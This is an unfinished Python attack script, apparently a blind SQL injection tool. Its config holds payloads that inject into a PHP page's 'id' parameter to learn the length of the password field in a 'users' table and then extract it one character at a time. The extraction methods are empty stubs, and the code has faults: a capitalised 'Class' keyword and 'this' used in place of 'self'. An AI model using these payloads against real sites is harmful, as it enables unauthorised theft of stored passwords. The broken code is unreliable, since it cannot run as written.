#!/usr/bin/env python3

from string import \
ascii_lowercase as L, \
ascii_uppercase as U, \
digits as D, \
punctuation as P

import requests

# TODO blind_length()

##### Config
HOST = ""
PORT = 80
PATH = "/index.php?id="
COOKIES = {
    "uid": "1"
}

CHARSET = D + L + U + P
LENGTH = 0

PAYLOAD_LENGTH = "1' AND (SELECT LENGTH(password) from users) = <LEN> #"
PAYLOAD_BLIND = "1' AND SUBSTR((SELECT password from users), <POS>, 1) = <CHR> #"

SERVER_YES = ""
SERVER_NO = ""
##########

Class Blind():
    def __init__(self, host, cookies, charset, payload_length, payload_blind):
        self.host = host
        self.cookies = cookies
        self.charset = charset
        self.length = 0
        self.maxlength = 100
        self.payload_length = payload_length
        self.payload_blind = payload_blind

        this.s = requests.Session()
        this.s.cookies.update(COOKIES)

    def blind_length(self):
        for i in range(self.maxlength):
            pass


    def blind(self):
        pass


if __name__ == "__main__":
    blind = Blind( HOST+':'+str(PORT)+PATH, COOKIES, CHARSET, PAYLOAD_LENGTH, PAYLOAD_BLIND )
